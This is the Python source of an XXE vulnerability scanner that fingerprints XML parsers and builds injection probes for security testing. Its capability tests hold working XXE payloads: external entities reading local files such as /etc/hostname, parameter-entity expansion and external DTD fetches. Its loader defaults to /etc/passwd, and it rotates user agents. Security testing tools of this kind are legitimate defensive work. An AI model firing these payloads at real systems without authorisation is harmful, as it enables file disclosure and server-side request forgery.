#!/usr/bin/env python3
"""
XXE-Ripper — standalone black-box XXE scanner.

Detects XML External Entity injection in in-band, error-based, and blind
out-of-band (OOB) forms, with low false-positive output via differential
parser fingerprinting, statistical baselining, and multi-indicator
matching. Findings are CWE-mapped and can be emitted as JSON or SARIF
v2.1.0 for CI/CD integration.

Highlights
----------
- 20+ attack technique families across in-band, error-based, blind,
  encoding-bypass, alternative-sink, and extended-fetcher classes.
- Differential parser fingerprinting across 11 XML stacks, with an
  on-disk cache so repeat scans skip the probe phase.
- Manual OOB confirmation via ``interactsh-client`` — the scanner
  builds payloads under your session domain and prints every subdomain
  it sends; you match callbacks in the interactsh terminal.
- Statistical baseline (median, IQR, p95, entropy) with graded vetoes
  that reject obvious noise without suppressing real findings.
- Per-phase exception isolation: a crash in one technique family
  cannot lose findings from the phases already completed.
- CWE mapping and SARIF output for GitHub code scanning, GitLab SAST,
  Azure DevOps, and any pipeline that consumes SARIF.
- Rate limiting, exponential retry/backoff, and a wall-clock scan
  budget to avoid accidental DoS on fragile targets.


Requirements
------------
- Python 3.9+
- requests, urllib3, flask
- interactsh-client for OOB confirmation (optional)
"""

import argparse
import httpx
import random
import json
import re
import socket
import ssl
import subprocess
import base64
import binascii
import time
import os
import sys
import uuid
import threading
import statistics
import hashlib
import math
import glob as _glob
from pathlib import Path
from urllib.parse import urlparse, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from dataclasses import dataclass, asdict, field
from typing import Optional, Dict, List, Tuple, Set, Iterable, Any

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

USER_AGENTS = [
    # Chrome / Chromium
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",

    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
    "Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) "
    "Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) "
    "Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) "
    "Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) "
    "Gecko/20100101 Firefox/121.0",

    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 "
    "Mobile/15E148 Safari/604.1",

    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

def _as_httpx_timeout(t) -> "httpx.Timeout":
    if t is None:
        return httpx.Timeout(15.0, connect=5.0)
    if isinstance(t, (int, float)):
        return httpx.Timeout(float(t))
    if isinstance(t, tuple) and len(t) >= 2:
        connect, read = t[0], t[1]
        c = float(connect) if connect else 5.0
        r = float(read) if read else 15.0
        return httpx.Timeout(r, connect=c, read=r, write=r, pool=c)
    return httpx.Timeout(15.0, connect=5.0)

DEFAULT_TIMEOUT = (5, 15)
MAX_THREADS = 20
DEBUG = False
_JOBS_BY_THREAD: Dict[int, Any] = {}
_JOBS_BY_THREAD_LOCK = threading.Lock()
BASELINE_SAMPLES = 7
TIMING_DELTA_RATIO = 2.5
TIMING_MIN_DELTA = 1.5
TIMING_IQR_MULTIPLIER = 4.0
_BATCH_LIMIT = MAX_THREADS
_BATCH_LIMIT_LOCK = threading.Lock()
_RUNNING_JOBS = 0
_RUNNING_JOBS_CV = threading.Condition()


def _set_batch_limit(n: int):
    global _BATCH_LIMIT
    with _BATCH_LIMIT_LOCK:
        _BATCH_LIMIT = max(1, int(n))
        return _BATCH_LIMIT


def _get_batch_limit() -> int:
    with _BATCH_LIMIT_LOCK:
        return _BATCH_LIMIT


def _acquire_scan_slot():
    global _RUNNING_JOBS
    with _RUNNING_JOBS_CV:
        limit = _get_batch_limit()
        while _RUNNING_JOBS >= limit:
            _RUNNING_JOBS_CV.wait()
        _RUNNING_JOBS += 1


def _release_scan_slot():
    global _RUNNING_JOBS
    with _RUNNING_JOBS_CV:
        _RUNNING_JOBS = max(0, _RUNNING_JOBS - 1)
        _RUNNING_JOBS_CV.notify_all()

# ---------------------------------------------------------------------------
# CWE mapping
# ---------------------------------------------------------------------------

CWE_MAP = {
    # In-band file disclosure
    "XXE-INBAND-FILE-READ":       ["CWE-611", "CWE-200"],
    "XXE-PHP-FILTER-SOURCE":      ["CWE-611", "CWE-200"],
    "XXE-PHP-EXPECT-RCE":         ["CWE-611", "CWE-78"],
    "XXE-ERROR-BASED":            ["CWE-611", "CWE-200"],

    # Error-based — split by technique
    "XXE-ERROR-BASED-LOCAL-DTD":  ["CWE-611", "CWE-200", "CWE-829"],
    "XXE-ERROR-BASED-MALFORMED":  ["CWE-611", "CWE-200"],

    # SSRF (via entity or XInclude)
    "XXE-SSRF":                   ["CWE-611", "CWE-918"],
    "XXE-XINCLUDE-SSRF":          ["CWE-611", "CWE-918"],

    # Blind (OOB) — no direct data return, only interaction
    "XXE-BLIND-OOB":              ["CWE-611"],
    "XXE-PARAMETER-ENTITY-OOB":   ["CWE-611"],
    "XXE-CDATA":                  ["CWE-611"],
    "XXE-TIMING-BLIND":           ["CWE-611"],

    # Encoding and DOCTYPE bypasses
    "XXE-ENCODING-BYPASS":        ["CWE-611"],
    "XXE-WAF-BYPASS":             ["CWE-611", "CWE-693"],

    # Alternative sinks
    "XXE-XINCLUDE":               ["CWE-611"],
    "XXE-SVG-UPLOAD":             ["CWE-611"],
    "XXE-SAML-ENVELOPE":          ["CWE-611"],
    "XXE-SAML-PRESIG":            ["CWE-611", "CWE-347"],
    "XXE-SOAP-ENVELOPE":          ["CWE-611"],
    "XXE-MULTIPART-XML":          ["CWE-611"],
    "XXE-DOCX-UPLOAD":            ["CWE-611"],

    # Extended fetchers — these all cause a server-side fetch
    "XXE-XSLT-DOCUMENT":          ["CWE-611", "CWE-918"],
    "XXE-XSLT-INCLUDE":           ["CWE-611", "CWE-918"],
    "XXE-XSD-SCHEMALOCATION":     ["CWE-611", "CWE-918"],
    "XXE-XSD-IMPORT":             ["CWE-611", "CWE-918"],
    "XXE-XML-STYLESHEET":         ["CWE-611", "CWE-918"],

    # Delivery vectors
    "XXE-CONTENT-TYPE":           ["CWE-611"],
    "XXE-METHOD":                 ["CWE-611"],
    "XXE-QUERY-PARAM":            ["CWE-611"],
    "XXE-FORM-ENCODED":           ["CWE-611"],
    "XXE-CUSTOM":                 ["CWE-611"],

    # JSON-to-XML content-type switching
    "XXE-JSON-TO-XML":            ["CWE-611", "CWE-200"],

    # Cloud metadata — highest-impact 2026 chain.
    "XXE-CLOUD-METADATA-AWS":     ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-GCP":     ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-AZURE":   ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-ALIBABA": ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-OCI":     ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-K8S":     ["CWE-611", "CWE-918", "CWE-200"],
    "XXE-CLOUD-METADATA-IMDSV2":  ["CWE-611", "CWE-918"],

    # Fallback for providers not listed above.
    "XXE-CLOUD-METADATA":         ["CWE-611", "CWE-918", "CWE-200"],

    # XSLT applied to Office document parts (DOCX, XLSX, PPTX, ODT)
    "XXE-OFFICE-XSLT":            ["CWE-611", "CWE-918"],

    # YAML deserialization via XML or form body
    "XXE-YAML-DESER":             ["CWE-502", "CWE-611"],

    # XXE-to-RCE via language-specific protocol wrappers
    "XXE-RCE-JAR":                ["CWE-611", "CWE-78"],
    "XXE-RCE-DATA":               ["CWE-611", "CWE-78"],
    "XXE-RCE-PHAR":               ["CWE-611", "CWE-78"],
    "XXE-RCE-GLOB":               ["CWE-611", "CWE-200"],
    "XXE-RCE-COMPRESS-ZLIB":      ["CWE-611", "CWE-200"],

    # DoS
    "XXE-DOS-BILLION-LAUGHS":     ["CWE-776"],

    # Informational — no CWE
    "XXE-PARSER-FINGERPRINT":     [],
}


CWE_DESCRIPTIONS = {
    "CWE-611": "Improper Restriction of XML External Entity Reference",
    "CWE-200": "Exposure of Sensitive Information to an Unauthorized Actor",
    "CWE-918": "Server-Side Request Forgery (SSRF)",
    "CWE-78":  "Improper Neutralization of Special Elements used in an OS Command",
    "CWE-776": "Improper Restriction of Recursive Entity References in DTDs",
    "CWE-829": "Inclusion of Functionality from Untrusted Control Sphere",
    "CWE-347": "Improper Verification of Cryptographic Signature",
    "CWE-693": "Protection Mechanism Failure",
    "CWE-502": "Deserialization of Untrusted Data",
}


def cwes_for(fid: str) -> List[str]:
    for prefix in sorted(CWE_MAP, key=len, reverse=True):
        if fid.startswith(prefix):
            return list(CWE_MAP[prefix])
    return []

def _debug_on() -> bool:
    job = _JOBS_BY_THREAD.get(threading.get_ident())
    if job is not None:
        return bool(job.config.get("debug", False)) or DEBUG
    return DEBUG

def dbg(*args):
    msg = " ".join(str(a) for a in args)
    job = _JOBS_BY_THREAD.get(threading.get_ident())
    if job is not None:
        try:
            job.emit("log", {"level": "debug", "msg": msg})
        except Exception:
            pass
    if _debug_on():
        print("[DEBUG]", msg, flush=True)

def warn(*args):
    msg = " ".join(str(a) for a in args)
    job = _JOBS_BY_THREAD.get(threading.get_ident())
    if job is not None:
        try:
            job.emit("log", {"level": "warn", "msg": msg})
        except Exception:
            pass
    print("[!]", msg, file=sys.stderr, flush=True)

# ---------------------------------------------------------------------------
# Fingerprint cache
# ---------------------------------------------------------------------------

FINGERPRINT_CACHE_DIR = Path.home() / ".cache" / "xxeripper"
FINGERPRINT_CACHE_FILE = FINGERPRINT_CACHE_DIR / "fingerprints.json"


def _load_fingerprint_cache() -> Dict[str, Any]:
    try:
        if FINGERPRINT_CACHE_FILE.exists():
            return json.loads(FINGERPRINT_CACHE_FILE.read_text())
    except Exception:
        pass
    return {}


def _save_fingerprint_cache(cache: Dict[str, Any]) -> None:
    try:
        FINGERPRINT_CACHE_DIR.mkdir(parents=True, exist_ok=True)
        FINGERPRINT_CACHE_FILE.write_text(json.dumps(cache, indent=2))
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Finding model
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    id: str
    severity: str
    title: str
    description: str
    impact: str
    confirmed: bool
    exploitability: str
    cwe: List[str] = field(default_factory=list)
    cwe_descriptions: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    reasons: List[str] = field(default_factory=list)
    confidence: int = 0

    def to_dict(self):
        return asdict(self)


# ---------------------------------------------------------------------------
# Rate limiter
# ---------------------------------------------------------------------------

class RateLimiter:

    def __init__(self, min_interval: float = 0.0):
        self.min_interval = max(0.0, min_interval)
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        if self.min_interval <= 0:
            return
        with self._lock:
            now = time.time()
            delta = now - self._last
            if delta < self.min_interval:
                time.sleep(self.min_interval - delta)
            self._last = time.time()


# ---------------------------------------------------------------------------
# Scan context (wall-clock budget + cancellation)
# ---------------------------------------------------------------------------

class ScanContext:
    def __init__(self, deadline: Optional[float] = None):
        self.deadline = deadline if deadline is not None else (time.time() + 3600)
        self._cancelled = threading.Event()

    def cancel(self):
        self._cancelled.set()

    def is_cancelled(self) -> bool:
        return self._cancelled.is_set()

    def expired(self) -> bool:
        return self._cancelled.is_set() or time.time() > self.deadline

    def remaining(self) -> float:
        return max(0.0, self.deadline - time.time())


# ---------------------------------------------------------------------------
# Parser Fingerprinting (differential)
# ---------------------------------------------------------------------------

class ParserFingerprint:

    SIGNATURES = {
        # --------------------------------------------------------------
        # libxml2 (lxml, PHP's ext/dom, Ruby XML::LibXML, Perl XML::LibXML)
        # --------------------------------------------------------------
        "libxml2": [
            # lxml Python-level exception class names
            "lxml.etree.XMLSyntaxError",
            "lxml.etree.ParseError",
            "lxml.etree._BaseError",
            "lxml.etree.DocumentInvalid",
            # libxml2 C-level function names that leak into messages
            "xmlParseEntityRef",
            "xmlParseEntity",
            "xmlParseCharRef",
            "xmlParseStartTag",
            "xmlParseAttValue",
            "xmlParserEntityCheck",
            "xmlLoadEntityContent",
            # libxml2 human-readable diagnostics
            "XMLSyntaxError",
            "StartTag: invalid element name",
            "Start tag expected",
            "Premature end of data in tag",
            "Unexpected end of data",
            "Extra content at the end of the document",
            "Opening and ending tag mismatch",
            "Document is empty",
            "DOCTYPE improperly terminated",
            "error parsing attribute name",
            "AttValue: \" or ' expected",
            # entity-specific
            "Entity 'xxe' not defined",
            "Entity 'send' not defined",
            "Entity 'error' not defined",
            "Entity 'file' not defined",
            "Entity 'remote' not defined",
            "Entity 'inner' not defined",
            "Entity 'eval' not defined",
            "Entity value required",
            "PEReference: %",
            "SYSTEM or PUBLIC, the URI is missing",
            # external load attempts (lowercase and capitalized variants)
            "Failed to load external entity",
            "failed to load external entity",
            "Could not load the external subset",
            "Attempt to load network entity",
            # expansion / security
            "Maximum entity amplification factor exceeded",
            "Detected an entity reference loop",
            "internal error: Huge input lookup",
            # namespace
            "Namespace prefix",
            "Namespace error",
            # PHP's libxml wrapper adds these prefixes to the same errors
            "I/O warning : failed to load external entity",
            "parser error :",
        ],

        # --------------------------------------------------------------
        # Apache Xerces (Java's default JAXP implementation, and the
        # JDK-shaded com.sun.org.apache.xerces.* tree)
        # --------------------------------------------------------------
        "xerces": [
            # class names (both external and JDK-internal)
            "org.apache.xerces",
            "com.sun.org.apache.xerces",
            "org.apache.xerces.parsers.DOMParser",
            "org.apache.xerces.jaxp.DocumentBuilderImpl",
            "org.apache.xerces.parsers.SAXParser",
            "org.apache.xerces.parsers.XML11Configuration",
            "ErrorHandlerWrapper",
            "Xerces",
            # SAX exception (Xerces is the typical underlying impl)
            "SAXParseException",
            # Xerces human-readable errors
            "was referenced, but not declared",
            "The entity name must immediately follow",
            "Content is not allowed in prolog",
            "DOCTYPE is disallowed",
            "External DTD: Failed to read external DTD",
            "External Entity: Failed to read external document",
            "must end with '>'",
            "must be declared",
            # validation errors (schema/DTD)
            "cvc-elt.",
            "cvc-complex-type.",
            "cvc-attribute.",
            "cvc-datatype-valid.",
        ],

        # --------------------------------------------------------------
        # .NET System.Xml
        # --------------------------------------------------------------
        "dotnet": [
            # namespace/class names
            "System.Xml.XmlException",
            "System.Xml.XmlReader",
            "System.Xml.XmlDocument",
            "System.Xml.XmlTextReader",
            "System.Xml.XmlReaderSettings",
            "System.Xml.XmlUrlResolver",
            "System.Xml.Linq.XDocument",
            "System.Xml.Linq.XElement",
            "System.Xml.XPath.XPathDocument",
            "System.Xml.Serialization.XmlSerializer",
            # .NET human-readable errors
            "An error occurred while parsing EntityName",
            "Unexpected end of file has occurred",
            "Data at the root level is invalid",
            "is an undeclared prefix",
            "Reference to undeclared entity",
            "There is an error in XML document",
            "There was an error deserializing the object",
            "For security reasons DTD is prohibited in this XML document",
            "DTD is prohibited",
            "XmlReaderSettings.DtdProcessing",
            "XmlReaderSettings.XmlResolver",
            "Name cannot begin with the",
            "cannot be included in a name",
        ],

        # --------------------------------------------------------------
        # Java SAX / JAXP (DocumentBuilder, SAXParser, TransformerFactory)
        # --------------------------------------------------------------
        "java_sax": [
            # org.xml.sax interfaces and classes
            "org.xml.sax.SAXParseException",
            "org.xml.sax.SAXException",
            "org.xml.sax.helpers.DefaultHandler",
            # JAXP factories and builders
            "DocumentBuilder",
            "DocumentBuilderFactory",
            "SAXParser",
            "SAXParserFactory",
            "DefaultHandler",
            "ContentHandler",
            "EntityResolver",
            # JAXP security subsystem error codes
            "JAXP00010001",
            "JAXP00010002",
            "JAXP00010003",
            "JAXP00010004",
            "JAXP00010005",
            # JAXP security property names that appear in error messages
            "AccessExternalDTD",
            "AccessExternalSchema",
            "accessExternalDTD",
            "accessExternalSchema",
            "disallow-doctype-decl",
            "external-general-entities",
            "external-parameter-entities",
            "load-external-dtd",
            "http://apache.org/xml/features/disallow-doctype-decl",
            "http://apache.org/xml/features/nonvalidating/load-external-dtd",
            "http://xml.org/sax/features/external-general-entities",
            "http://xml.org/sax/features/external-parameter-entities",
            # TransformerFactory security
            "javax.xml.transform.TransformerException",
            "FEATURE_SECURE_PROCESSING",
        ],

        # --------------------------------------------------------------
        # Java StAX (XMLInputFactory / XMLStreamReader). Distinct error
        # surface from SAX; Woodstox and Aalto are common implementations.
        # --------------------------------------------------------------
        "java_stax": [
            "javax.xml.stream.XMLStreamException",
            "javax.xml.stream.XMLInputFactory",
            "XMLStreamReader",
            "XMLStreamWriter",
            "XMLInputFactory",
            "IS_SUPPORTING_EXTERNAL_ENTITIES",
            "IS_REPLACING_ENTITY_REFERENCES",
            "SUPPORT_DTD",
            "woodstox",
            "com.ctc.wstx",
            "aalto",
        ],

        # --------------------------------------------------------------
        # Python stdlib XML (etree, minidom, sax) — expat under the hood
        # --------------------------------------------------------------
        "python_etree": [
            "xml.etree.ElementTree.ParseError",
            "xml.etree.ElementTree.ParseError:",
            "xml.etree.ElementTree",
            "ElementTree.ParseError",
            "xml.dom.minidom",
            "xml.dom.expatbuilder",
            "xml.dom.pulldom",
            "xml.sax",
            "xml.sax.saxutils",
            "xml.parsers.expat",
            "xml.parsers.expat.ExpatError",
            # expat-native error strings
            "undefined entity",
            "not well-formed (invalid token)",
            "not well-formed",
            "mismatched tag",
            "XML or text declaration not at start of entity",
            "reference to invalid character number",
            "no element found",
            "junk after document element",
            "unclosed token",
            "unbound prefix",
        ],

        # --------------------------------------------------------------
        # PHP ext/dom and SimpleXML (also libxml2 under the hood, but the
        # PHP wrapper emits prefixed warning lines that are distinctive)
        # --------------------------------------------------------------
        "php_libxml": [
            "Warning: DOMDocument::load",
            "Warning: DOMDocument::loadXML",
            "Warning: DOMDocument::loadHTML",
            "Warning: SimpleXMLElement::__construct",
            "Warning: simplexml_load_string",
            "Warning: simplexml_load_file",
            "Warning: XMLReader::open",
            "Warning: XMLReader::XML",
            "DOMDocument::loadXML():",
            "DOMDocument::load():",
            "SimpleXMLElement::__construct():",
            "simplexml_load_string():",
            "simplexml_load_file():",
            # PHP 7+ exception wrapper around parser errors
            "Fatal error: Uncaught Error:",
            "Fatal error: Uncaught DOMException:",
            "DOMException:",
        ],

        # --------------------------------------------------------------
        # Ruby — REXML (stdlib), Nokogiri (libxml2 binding), libxml-ruby
        # --------------------------------------------------------------
        "ruby": [
            "REXML::ParseException",
            "REXML::UndefinedNamespaceException",
            "REXML::ParseException:",
            "Nokogiri::XML::SyntaxError",
            "Nokogiri::XML::SyntaxError:",
            "Nokogiri::XML::XPath::SyntaxError",
            "LibXML::XML::Error",
            "The entity expansion has been blocked",
            "EntityRef: expecting ';'",
            "Malformed XML:",
            "unexpected token at",
        ],

        # --------------------------------------------------------------
        # Node.js — xml2js, libxmljs, node-expat, sax.js, fast-xml-parser
        # --------------------------------------------------------------
        "node": [
            "ExpatError",
            "xml2js",
            "libxmljs",
            "fast-xml-parser",
            "Non-whitespace before first tag",
            "Text data outside of root node",
            "Unexpected close tag",
            "Unencoded <",
            "Error: Entity: line",
            "node-expat",
            "node_xslt",
            "Invalid character in entity",
            "Invalid attribute name",
        ],

        # --------------------------------------------------------------
        # Perl — XML::LibXML, XML::Parser (expat), XML::SAX, XML::Simple
        # --------------------------------------------------------------
        "perl": [
            "XML::LibXML",
            "XML::LibXML::Error",
            "XML::SAX",
            "XML::Parser",
            "XML::Simple",
            "XML::Twig",
            "Couldn't parse",
            "not well-formed",
            "parser error",
        ],

        # --------------------------------------------------------------
        # Go — encoding/xml (stdlib). Go does not resolve external
        # entities, but distinctive error strings still help identify
        # which language the target runs on.
        # --------------------------------------------------------------
        "go": [
            "encoding/xml",
            "xml: syntax error",
            "XML syntax error on line",
            "xml: cannot unmarshal",
            "xml: unexpected EOF",
            "xml: invalid character",
        ],
    }

    CAPABILITY_TESTS = {
        "dtd_allowed": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root [<!ELEMENT root (#PCDATA)>]>'
                        '<root>OK_MARKER</root>'),
            "success": lambda b, s: s == 200 and "OK_MARKER" in b,
        },

        "dtd_entity_syntax_accepted": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root ['
                        '<!ENTITY x "ENTITY_MARKER">'
                        ']>'
                        '<root>ACCEPT_MARKER</root>'),
            "success": lambda b, s: s == 200 and "ACCEPT_MARKER" in b,
        },

        "dtd_parsed_but_not_resolved": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root [<!ENTITY x "ENTITY_MARKER">]>'
                        '<root>&x;</root>'),
            "success": lambda b, s: s == 200 and "&x;" in b,
        },

        "internal_entity": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root [<!ENTITY x "ENTITY_MARKER">]>'
                        '<root>&x;</root>'),

            "success": lambda b, s: (s == 200
                                     and "ENTITY_MARKER" in b
                                     and "&x;" not in b),
        },

        "external_file": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>'
                        '<root>&x;</root>'),
            "success": lambda b, s: (
                s == 200
                and "file://"   not in b
                and "<!DOCTYPE" not in b
                and "<root>"    not in b
                and "&x;"       not in b
                and re.fullmatch(r"\s*[A-Za-z0-9][A-Za-z0-9.\-]{2,}\s*",
                                 b.strip()) is not None
            ),
        },
        "parameter_entity": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root ['
                        '<!ENTITY % p "<!ENTITY inner \'PE_MARKER\'>">'
                        '%p;'
                        ']>'
                        '<root>&inner;</root>'),
            "success": lambda b, s: (
                "PE_MARKER" in b
                and "&inner;" not in b
            ),
        },
        "external_dtd": {
            "payload": ('<?xml version="1.0"?>'
                        '<!DOCTYPE root SYSTEM "http://127.0.0.1:1/nonexistent.dtd">'
                        '<root>test</root>'),
            "success": lambda b, s: (
                s >= 500
                or "Connection refused" in b
                or "IO error" in b
                or "Failed to load external entity" in b
                or "Could not load" in b
            ),
        },
    }

    BENIGN_CONTROL = '<?xml version="1.0"?><root><x>CTRL_MARKER</x></root>'

    def __init__(self, session, url, cookies, base_request=None,
                 send_fn=None):
        self.session = session
        self.url = url
        self.cookies = cookies
        self.base_request = base_request
        self.parser = "unknown"
        self.capabilities: Dict[str, bool] = {}
        self.error_text = ""
        self._send_fn = send_fn

    def _probe(self, payload: str) -> Optional[httpx.Response]:
        if self._send_fn is not None:
            resp, _ = self._send_fn(payload)
            return resp
        headers = self._build_headers()
        try:
            return self.session.request(
                "POST", self.url, headers=headers,
                content=payload.encode("utf-8"),
                timeout=_as_httpx_timeout(DEFAULT_TIMEOUT),
                follow_redirects=False,
            )
        except Exception:
            return None

    def _build_headers(self) -> Dict[str, str]:
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": random.choice(USER_AGENTS),
        }
        if self.cookies and self.cookies.header_value():
            headers["Cookie"] = self.cookies.header_value()
        return headers

    def fingerprint(self) -> str:
        control = self._probe(self.BENIGN_CONTROL)
        control_body = (control.text or "") if control is not None else ""
        control_status = control.status_code if control is not None else 0

        for cap_name, spec in self.CAPABILITY_TESTS.items():
            test = self._probe(spec["payload"])
            if test is None:
                self.capabilities[cap_name] = False
                continue
            body = test.text or ""
            try:
                test_pass = bool(spec["success"](body, test.status_code))
                ctrl_pass = bool(spec["success"](control_body, control_status)) \
                    if control is not None else False
                self.capabilities[cap_name] = test_pass and not ctrl_pass
            except Exception:
                self.capabilities[cap_name] = False

            if test.status_code >= 500 \
                    or "Exception" in body or "Error" in body:
                self.error_text += body[-2000:] + "\n"

        best_name = "unknown"
        best_hits = 0
        for parser_name, sigs in self.SIGNATURES.items():
            hits = sum(1 for sig in sigs if sig in self.error_text)
            if hits > best_hits:
                best_hits = hits
                best_name = parser_name
        if best_hits > 0:
            self.parser = best_name

        dbg(f"Parser: {self.parser}, caps: {self.capabilities}")
        return self.parser

    def best_payload_family(self) -> List[str]:
        families = []
        if self.capabilities.get("dtd_allowed"):
            families.append("classic")
        if self.capabilities.get("dtd_entity_syntax_accepted"):
            families.append("dtd_syntax")
        if self.capabilities.get("dtd_parsed_but_not_resolved"):
            families.append("dtd_unresolved")
        if self.capabilities.get("external_file"):
            families.append("file_read")
        if self.capabilities.get("parameter_entity"):
            families.append("parameter_entity")
        if self.capabilities.get("external_dtd"):
            families.append("external_dtd")
        if self.capabilities.get("internal_entity"):
            families.append("entity_expansion")
        families.extend(["error_based", "oob"])
        return list(dict.fromkeys(families))


# ---------------------------------------------------------------------------
# Cookie Manager
# ---------------------------------------------------------------------------

class CookieManager:
    def __init__(self, inline: Optional[str] = None,
                 cookie_file: Optional[str] = None,
                 cookie_content: Optional[str] = None,
                 burp_headers: Optional[Dict[str, str]] = None,
                 merge_set_cookie: bool = True):
        self._jar: Dict[str, str] = {}
        self.merge_set_cookie = merge_set_cookie
        if burp_headers:
            for k, v in burp_headers.items():
                if k.lower() == "cookie":
                    self._parse_cookie_string(v)
        if cookie_content:
            self._load_cookie_content(cookie_content)
        if cookie_file:
            if os.path.exists(cookie_file):
                self._load_cookie_file(cookie_file)
            else:
                warn(f"Cookie file not found: {cookie_file}")
        if inline:
            self._parse_cookie_string(inline)

    def _parse_cookie_string(self, raw: str):
        for part in raw.split(";"):
            part = part.strip()
            if not part or "=" not in part:
                continue
            k, v = part.split("=", 1)
            self._jar[k.strip()] = v.strip()

    def _load_cookie_content(self, content: str):
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.count("\t") >= 6:
                parts = line.split("\t")
                if len(parts) >= 7:
                    self._jar[parts[5].strip()] = parts[6].strip()
                    continue
            if "=" in line:
                k, v = line.split("=", 1)
                self._jar[k.strip()] = v.strip()

    def _load_cookie_file(self, path: str):
        try:
            with open(path, "r") as f:
                self._load_cookie_content(f.read())
        except Exception as e:
            warn(f"Failed to load cookie file {path}: {e}")

    def merge_response_cookies(self, response: httpx.Response):
        if not self.merge_set_cookie:
            return
        try:
            for name, value in response.cookies.items():
                self._jar[name] = value
        except Exception:
            pass

    def header_value(self) -> Optional[str]:
        if not self._jar:
            return None
        return "; ".join(f"{k}={v}" for k, v in self._jar.items())

    def has_cookies(self) -> bool:
        return bool(self._jar)

    def as_dict(self) -> Dict[str, str]:
        return dict(self._jar)


# ---------------------------------------------------------------------------
# Custom Payload Loader
# ---------------------------------------------------------------------------

class CustomPayload:
    def __init__(self, name: str, template: str):
        self.name = name
        self.template = template

    def render(self, file_target: str = "/etc/passwd",
               callback: str = "", domain: str = "",
               url: str = "", host: str = "") -> str:
        out = self.template
        for k, v in [("{FILE}", file_target), ("{CALLBACK}", callback),
                     ("{DOMAIN}", domain), ("{URL}", url), ("{HOST}", host)]:
            out = out.replace(k, v)
        return out

    def encode(self, rendered: str) -> bytes:
        if self.name.startswith("b64:"):
            try:
                return base64.b64decode(rendered)
            except Exception:
                return rendered.encode("utf-8")
        if self.name.startswith("hex:"):
            try:
                return bytes.fromhex(rendered.strip())
            except Exception:
                return rendered.encode("utf-8")
        return rendered.encode("utf-8")


class CustomPayloadLoader:
    def __init__(self):
        self.payloads: List[CustomPayload] = []

    def add_inline(self, raw: str, name: str = "inline"):
        if raw and raw.strip():
            self.payloads.append(CustomPayload(name, raw))

    def add_content(self, content: str, name: str):
        chunks = re.split(r"(?m)^\s*---\s*$", content)
        if len(chunks) == 1:
            parts = re.split(r"(?=<\?xml\s)", content)
            parts = [p for p in parts if p.strip()]
            chunks = parts if len(parts) > 1 else [content]
        for idx, chunk in enumerate(chunks):
            if chunk.strip():
                name_i = f"{name}#{idx}" if len(chunks) > 1 else name
                self.payloads.append(CustomPayload(name_i, chunk))

    def add_file(self, path: str):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            warn(f"Failed to load payload file {path}: {e}")
            return
        self.add_content(content, Path(path).stem)

    def add_dir(self, dirpath: str):
        p = Path(dirpath)
        if not p.is_dir():
            warn(f"Payload dir not found or not a directory: {dirpath}")
            return
        for f in sorted(p.iterdir()):
            if f.is_file() and f.suffix.lower() in {".xml", ".txt", ".payload"}:
                self.add_file(str(f))

    def __iter__(self) -> Iterable[CustomPayload]:
        return iter(self.payloads)

    def __len__(self) -> int:
        return len(self.payloads)


